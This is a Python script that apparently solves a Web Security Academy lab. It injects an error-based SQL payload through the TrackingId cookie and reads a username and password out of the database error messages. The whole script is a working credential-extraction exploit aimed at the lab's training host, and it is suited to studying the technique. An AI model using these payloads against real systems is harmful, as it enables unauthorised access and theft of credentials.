import requests
from bs4 import BeautifulSoup
url = "https://0ace00d403a0648680583ff8006700f2.web-security-academy.net/filter?category=Tech+gifts"

sqli_username = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
sqli_password = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"

headersUsername = {
    "Host": "0ace00d403a0648680583ff8006700f2.web-security-academy.net",
    "Cookie" : f"TrackingId={sqli_username}",
    'Content-Length': '0',
    'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=0, i'
}

responseUsername = requests.get(url=url, headers=headersUsername).text
soupForUsername = BeautifulSoup(responseUsername, "html.parser")
usernameData = soupForUsername.find("h4").text.replace("ERROR: invalid input syntax for type integer: ", "")
print("Username: " + usernameData)

headersPassword = {
    "Host": "0ace00d403a0648680583ff8006700f2.web-security-academy.net",
    "Cookie" : f"TrackingId={sqli_password}",
    'Content-Length': '0',
    'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=0, i'
}

responsePassword = requests.get(url=url, headers=headersPassword).text
soupForPassword = BeautifulSoup(responsePassword, "html.parser")
passwordData = soupForPassword.find("h4").text.replace("ERROR: invalid input syntax for type integer: ", "")
print("Password: " +passwordData)
print("Please login to solve the lab!")